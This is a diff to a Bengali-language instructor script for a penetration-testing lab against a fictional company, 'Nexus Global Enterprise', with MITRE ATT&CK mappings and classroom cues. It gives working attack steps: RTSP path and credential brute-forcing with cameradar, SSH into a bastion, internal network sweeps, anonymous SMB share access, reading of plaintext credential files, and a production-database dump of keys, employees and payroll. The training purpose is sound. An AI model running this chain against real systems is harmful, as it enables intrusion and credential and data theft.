@@ -543,21 +543,20 @@ curl -X POST http://<VPS_IP>/login \
 **কীভাবে জানলাম CCTV আছে?**
 > *"nmap -sV তে দেখেছিলাম: port 8554 — rtsp, server: mediamtx। RTSP মানে Real Time Streaming Protocol — এটা IP camera র protocol। port 8888 এ same mediamtx — HLS (browser-friendly) version।"*
 
-**Browser এ দেখো (Chrome এ RTSP কাজ করে না — HLS use করো):**
-```
-http://<VPS_IP>:8888/nexus-lobby/index.m3u8
-http://<VPS_IP>:8888/nexus-serverroom/index.m3u8
-http://<VPS_IP>:8888/nexus-parking/index.m3u8
-```
-
-**VLC দিয়ে:**
+**Black-box এ যা করবো — port দেখে connect try করবো:**
 ```bash
-vlc rtsp://<VPS_IP>:8554/nexus-lobby
-vlc rtsp://<VPS_IP>:8554/nexus-serverroom
+# Common path try করো:
+vlc rtsp://<VPS_IP>:8554/live
+vlc rtsp://<VPS_IP>:8554/stream
+vlc rtsp://<VPS_IP>:8554/camera
+# Not found — path জানি না
+
+# Tool দিয়ে path discover করা যায়:
+cameradar -t <VPS_IP>   # RTSP path + credential bruteforce
 ```
 
 **বলো:**
-> *"কোনো authentication নেই। যে কেউ live camera feed দেখতে পারছে। Real company তে এরকম exposed CCTV অনেক common।"*
+> *"Port দেখেছি, service চলছে — কিন্তু exact stream path জানি না। Black-box এ cameradar দিয়ে try করা যায়। Gray-box এ client internal documentation দিলে সরাসরি path পাবো।"*
 
 **MITRE ATT&CK:**
 > `T1125 — Video Capture`
@@ -665,12 +664,50 @@ http://<VPS_IP>:9001
 > *"Black-box এ আমরা outside থেকে scan করেছিলাম। এখন আমরা inside থেকে দেখবো — bastion shell আছে, সেখান থেকে internal network discover করবো। এই internal hosts গুলো বাইরে থেকে দেখাই যেত না।"*
 
 ```bash
-# Bastion এ login করো
 ssh devops-remote@<VPS_IP> -p 2222
+# Password: devops-remote@123
+```
 
-# Internal subnets discover করো
+**Real Output (Banner দেখাও class এ):**
+```
+╔══════════════════════════════════════════════════════════╗
+║   NEXUS GLOBAL ENTERPRISE — SSH BASTION HOST (DMZ)      ║
+║   Node: bastion.nexus.internal | IP: 10.0.1.40          ║
+║   ** AUTHORIZED PERSONNEL ONLY **                        ║
+║   All sessions are monitored, logged, and recorded.      ║
+╚══════════════════════════════════════════════════════════╝
+
+Welcome to Nexus Global Enterprise Bastion Host
+================================================
+Internal Routes available via this Bastion:
+  Core Backbone:  10.0.2.0/24  (AD-DC, SIEM)
+  Data Center:    10.0.3.0/24  (ERP, DB, SAN)
+  Campus Clients: 10.0.4.0/24  (Workstations)
+```
+
+**বলো:**
+> *"Shell পেয়ে গেছি। এখন আমরা DMZ zone এ আছি। Banner নিজেই বলছে — কোন কোন internal network এখান থেকে reach করা যাবে। Core, Data Center, Campus — সব।"*
+
+```bash
 ip route
-# দেখবে: 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24
+ip addr
+```
+
+**Real Output:**
+```
+bastion:~$ ip route
+default via 10.0.4.254 dev eth0
+10.0.1.0/24 dev eth3  src 10.0.1.40   ← DMZ
+10.0.2.0/24 dev eth1  src 10.0.2.5    ← Core (AD, SIEM, Grafana)
+10.0.3.0/24 dev eth2  src 10.0.3.5    ← Data Center (DB, MinIO)
+10.0.4.0/24 dev eth0  src 10.0.4.5    ← Campus (Workstations)
+```
+
+**WOW Moment — এখানে pause করো:**
+> *"দেখো — এই bastion machine টা ৪টা আলাদা network এ connected। DMZ, Core, Data Center, Campus — সব। Black-box এ আমরা শুধু DMZ দেখতে পাচ্ছিলাম — বাকি সব invisible ছিল। এখন সব reach করা যাচ্ছে।*
+>
+> *এই কারণে bastion machine গুলো সবচেয়ে sensitive — এটা compromise হলে পুরো network compromise।"*
+
 
 # Core network sweep:
 for i in $(seq 1 254); do
@@ -737,36 +774,138 @@ cat ~/.netrc 2>/dev/null        # Network credentials
 ### 💎 Gray-box Exclusive #2 — SMB Share Credential Leak
 
 **বলো:**
-> *"AD server এ একটা SMB share আছে — IT-Backups। Black-box এ share list দেখা যায় কিন্তু credential ছাড়া ভেতরে ঢোকা যায় না। Gray-box এ এখন authenticated access পাবো।"*
+> *"AD server এ SMB share আছে — IT-Backups। এই port টা internet থেকে accessible ছিল না — তাই black-box এ দেখাই যায়নি। Bastion shell পেয়েছি — internal থেকে try করি।"*
 
 ```bash
-# Bastion থেকে:
-# Black-box এও এটুকু দেখা যেত — share list:
+# Bastion থেকে — share list দেখো (anonymous):
 smbclient -L //10.0.2.10 -N
+```
 
-# Gray-box — Authenticated access:
-smbclient //10.0.2.10/IT-Backups -U "tahmed%DevOpsP@ss2026!"
+**Real Output:**
+```
+Sharename       Type      Comment
+---------       ----      -------
+netlogon        Disk      Network Logon Service
+sysvol          Disk      Active Directory SYSVOL Share
+IT-Backups      Disk      IT Engineering Backup (RESTRICTED)
+HR-Public       Disk      HR Shared Policies
+IPC$            IPC       IPC Service
+```
 
+```bash
+# IT-Backups — RESTRICTED লেখা, তবু try করো (anonymous):
+smbclient //10.0.2.10/IT-Backups -N
 smb: \> ls
-smb: \> get sync_prod_db.sh       # DB backup script
-smb: \> get INFRA_RUNBOOK.txt     # Infrastructure runbook
+smb: \> get INFRA_RUNBOOK.txt
+smb: \> get sync_prod_db.sh
 smb: \> exit
+```
 
-# File দেখো:
+**WOW Moment — কোনো credential ছাড়াই ঢুকে গেছি!**
+
+```bash
 cat sync_prod_db.sh
-# দেখবে: PGPASSWORD="Nexu$$Prod2026!Sec" pg_dump -h 10.0.3.20 ...
+```
+**Real Output:**
+```bash
+DB_HOST="10.0.3.20"
+DB_USER="nexus_admin"
+DB_PASS="Nexu$Prod2026!Sec"                       # ← Production DB password!
+SAN_HOST="10.0.3.30:9000"
+SAN_USER="nexus_san_root"
+SAN_PASS="SuperS3cUr3_B4ckup_Vault_Pass_2026!"    # ← MinIO password!
+```
+
+**Board এ লেখো:**
+```
+🔑 SMB IT-Backups (anonymous!) → sync_prod_db.sh:
+
+  Production DB:  nexus_admin / Nexu$Prod2026!Sec  → 10.0.3.20:5432
+  MinIO Backup:   nexus_san_root / SuperS3cUr3_B4ckup_Vault_Pass_2026!
+  ERP Portal:     http://10.0.3.10:8000
 ```
 
 **বলো:**
-> *"Jackpot। IT backup script এ production database এর password hardcoded। এটা সম্পূর্ণ gray-box exclusive — black-box এ share দেখা যেত কিন্তু ভেতরে credential ছাড়া ঢোকা যেত না।"*
+> *"RESTRICTED লেখা share — anonymous access দিয়েই ঢুকলাম। ভেতরে production DB password plaintext এ। এই দুটো mistake একসাথে — এটাই real world এ সবচেয়ে বেশি দেখা যায়।"*
 
 **MITRE ATT&CK:**
 > `T1039 — Data from Network Shared Drive`
 > `T1552.001 — Credentials in Files`
 
+
 ---
 
-### 💎 Gray-box Exclusive #3 — Grafana: Monitoring System Takeover
+### 💎 Gray-box Exclusive #3 — Production Database Access (Crown Jewels)
+
+**বলো:**
+> *"SMB থেকে DB credentials পেয়েছি। এখন সরাসরি production database এ ঢুকবো।"*
+
+```bash
+PGPASSWORD='Nexu$Prod2026!Sec' psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
+```
+
+```sql
+\pset pager off
+\dt
+SELECT * FROM system_vault_keys;
+SELECT * FROM employees LIMIT 5;
+SELECT * FROM payroll LIMIT 3;
+```
+
+**Real Output — system_vault_keys (FLAG এখানে!):**
+```
+ id | key_name                  | service_scope                  | encrypted_secret
+----+---------------------------+--------------------------------+----------------------------------------------------
+  1 | AWS_TRANSIT_GATEWAY_KEY   | Cloud DC Bridge (AWS HQ)       | AKIA-NEXUS-PROD-9812448109-SECKEY-ALPHA
+  2 | SWIFT_CLEARING_API_TOKEN  | Interbank Wire Gateway (SWIFT) | jwt_live_nexus_swift_bank_tx_881920194012948102
+  3 | SAN_MASTER_ROOT_ACCESS    | MinIO Backup SAN               | nexus_san_root:SuperS3cUr3_B4ckup_Vault_Pass_2026!
+  4 | AZURE_SERVICE_PRINCIPAL   | Azure AD B2B Peering           | nexus-sp-prod:AzureServicePrincipal#Nexus_2026@DC!
+  5 | CTF_FLAG_DATABASE_ROOT    | Red Team Proof of Compromise   | FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
+```
+
+**Real Output — employees:**
+```
+ id | emp_id  | full_name     | username | department               | privilege_level
+----+---------+---------------+----------+--------------------------+-----------------
+  1 | EMP-001 | Marcus Vance  | mvance   | Executive InfoSec        | Domain Admin
+  2 | EMP-002 | Elena Rostova | erostova | Infrastructure Arch      | Domain Admin
+  3 | EMP-003 | Tanvir Ahmed  | tahmed   | DevOps & SRE             | Domain User
+  4 | EMP-004 | Sarah Jenkins | sjenkins | Human Resources          | Domain User
+  5 | EMP-005 | Amina Rahman  | arahman  | Financial Audit          | Domain User
+```
+
+**Real Output — payroll:**
+```
+ id | account_num    | beneficiary               | monthly_salary | swift_code
+----+----------------+---------------------------+----------------+------------
+  1 | ACC-889102-USD | Marcus Vance (CISO)       | $18,500.00     | CHASUS33
+  2 | ACC-551928-EUR | Elena Rostova (Lead Arch) | €14,200.00     | DEUTDEDB
+  3 | ACC-221940-BDT | Tanvir Ahmed (DevOps)     | ৳3,20,000.00   | EBLDBDDH
+```
+
+**এখানে দীর্ঘ pause নাও। Board এ লেখো:**
+```
+🏆 FLAG:  FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
+
+Real-world impact যদি এটা actual pentest হতো:
+  💳 SWIFT Banking Token → interbank wire fraud সম্ভব
+  ☁️  AWS Root Key → cloud infrastructure takeover
+  🔵 Azure SP → Azure AD compromise
+  👥 Domain Admin list → mvance, erostova (next attack target)
+  💰 Payroll + Bank accounts → financial fraud
+```
+
+**বলো:**
+> *"এটাই crown jewels। একটা SMB misconfiguration থেকে শুরু হয়ে production database পর্যন্ত এলাম। Real pentest এ এই chain টা report এ লিখলে client এর board level এ impact পৌঁছায়।"*
+
+**MITRE ATT&CK:**
+> `T1078.002 — Valid Accounts: Domain Accounts`
+> `T1213 — Data from Information Repositories`
+
+---
+
+### 💎 Gray-box Exclusive #4 — Grafana: Monitoring System Takeover
+
 
 **বলো:**
 > *"প্রতিটা enterprise এ একটা monitoring system থাকে — network কেমন চলছে, কোন server এ কতটুকু load, সব দেখার জন্য। Nexus এ Grafana আছে। Black-box এ এই service টা দেখাই যাচ্ছিল না — কারণ এটা internal network এ। Gray-box এ আমরা জানি এটা 10.0.2.21 তে আছে।"*
